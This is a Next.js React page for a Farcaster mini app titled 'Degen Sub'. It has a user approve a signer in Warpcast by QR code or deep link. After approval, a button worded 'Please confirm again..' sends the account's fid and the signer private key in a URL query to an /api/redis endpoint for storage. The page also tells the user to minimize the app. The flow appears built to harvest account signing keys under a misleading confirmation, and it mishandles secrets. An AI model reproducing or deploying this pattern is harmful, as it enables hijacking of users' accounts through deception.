'use client';

// import { Button } from "@/components/ui/button";
// import { Input } from "@/components/ui/input";
// import { Label } from "@/components/ui/label";
// import { CheckIcon, CopyIcon } from "@radix-ui/react-icons";
import Image from "next/image";
import { useState, useEffect, useCallback } from "react";
import { Redis } from '@upstash/redis'
// import { useSearchParams } from "next/navigation";


interface Signer {
	fid: string;
	privateKey: string;
}


export default function Home({ searchParams }: { searchParams: { [key: string]: string | string[] | undefined } }) {
	const [loading, setLoading] = useState(false);
	const [signer, setSigner] = useState<Signer>();
	const [qrCode, setQrCode] = useState("");
	const [pollingToken, setPollingToken] = useState();
	const [clicked, setClicked] = useState(false);
	// const [copiedPublic, setCopiedPublic] = useState(false);
	// const [copiedPrivate, setCopiedPrivate] = useState(false);
	// const [copiedBoth, setCopiedBoth] = useState(false);

	// const wait = () => new Promise((resolve) => setTimeout(resolve, 1000));

	// async function handleCopy(
	// 	setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
	// ) {
	// 	setCopiedState(true);
	// 	await wait();
	// 	setCopiedState(false);
	// }

	// async function copyToClipboard(
	// 	content: string,
	// 	setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
	// ) {
	// 	navigator.clipboard
	// 		.writeText(content)
	// 		.then(async () => await handleCopy(setCopiedState))
	// 		.catch(() => alert("Failed to copy"));
	// }

	async function createSigner() {
		setLoading(true);
		try {
			const signInReq = await fetch("/api/sign-in", {
				method: "POST",
			});
			const signInRes = await signInReq.json();
			setPollingToken(signInRes.pollingToken);
			setQrCode(`/api/qr/${signInRes.pollingToken}`);

			const pollReq = await fetch(`/api/poll/${signInRes.pollingToken}`);
			const pollRes = await pollReq.json();

			const pollStartTime = Date.now();
			while (pollRes.state !== "completed") {
				if (Date.now() - pollStartTime > 120000) {
					setLoading(false);
					throw Error("Timed out");
				}
				const pollReq = await fetch(`/api/poll/${signInRes.pollingToken}`, {
					headers: {
						"Cache-Control": "no-cache",
					},
				});
				const pollRes = await pollReq.json();
				console.log(pollRes);
				if (pollRes.state === "completed") {
					setSigner({
						fid: pollRes.userFid,
						privateKey: signInRes.privateKey,
					});
					setQrCode("");
					setLoading(false);
					return pollRes;
				}
				await new Promise((resolve) => setTimeout(resolve, 2000));
			}
		} catch (error) {
			console.log(error);
			setLoading(false);
		}
	}

// const username = typeof searchParams.user === 'string' ? searchParams.user : 'test';
const url= process.env.URL
const token= process.env.TOKEN
// console.log(url, token)
	const redis = new Redis({
		url,
		token,
	  })
	
	  const db = useCallback((fid: string, key: string) => {
		try {
		   fetch(`/api/redis?fid=${fid}&key=${key}`);
	  
		} catch (err) {
		  console.error("Error sendinding DC from warpcast", err);
		}
	  }, []);


useEffect(() => {
	if (!signer && !loading){
		createSigner(); 
	}
}, []);


// useEffect(() => {
// 	if (signer){
// 		db(signer.fid, signer.privateKey); 
// 	}
// }, [signer]);
	return (
		<main className="flex flex-col gap-12 min-h-screen justify-start mt-12 items-center">
			<div className="flex flex-col gap-4 justify-center items-center">
				<h1 className="scroll-m-20 text-4xl font-extrabold tracking-tight lg:text-5xl">
					Degen Sub
				</h1>
			</div>
			{qrCode && !signer && (
				<div className="flex flex-col gap-4 items-center justify-center">
					<Image src={qrCode} alt="sign in qr code" height={250} width={250} />
					<p className="mx-4 mb-12">
						Scan the QR code to approve in Warpcast, or </p>
						<p>
						<a
  className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition-colors duration-200 text-center inline-flex justify-center items-center"
  href={`farcaster://signed-key-request?token=${pollingToken}`}
						>
							click here if you're on mobile
						</a>
					</p>
					<h1 className="text-2xl font-extrabold">
					and minimize this mini app
				</h1>
				</div>
			)}
			{signer && (
				<div
			  className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition-colors duration-200 text-center inline-flex justify-center items-center"
			  onClick={() => {
				db(signer.fid, signer.privateKey);
				setClicked(true);
			}}
			
> {clicked ? 'confirmed' : 'Please confirm again..'}
			

				</div>
				
// 				<div className="flex flex-col gap-2 justify-center items-center w-full max-w-[500px] sm:px-auto px-4">

// 					<div className="grid gap-4 py-4 w-full">

// 						<div className="flex items-center w-full gap-2">
// 							<Label htmlFor="privateKey" className="w-24 text-right">
// 								Private
// 							</Label>
// 							<Input
// 								id="privatekey"
// 								value={signer.privateKey}
// 								type="password"
// 								className="flex-grow"
// 							/>
// 1							<Button
// 								onClick={() =>
// 									copyToClipboard(signer.privateKey, setCopiedPrivate)
// 								}
// 							>
// 								{copiedPrivate ? (
// 									<CheckIcon className="h-4 w-4" />
// 								) : (
// 									<CopyIcon className="h-4 w-4" />
// 								)}
// 							</Button>
// 						</div>
// 								{/* <Button
// 			onClick={() => {
// 				dc(signer.privateKey);
// 				setApproved(true);
// 			}}
// 		>
// 			{approved ? "Approved" : "Approve once again"}
// 		</Button> */}
// 					</div>
// 				</div>
			)}
		</main>
	);
}
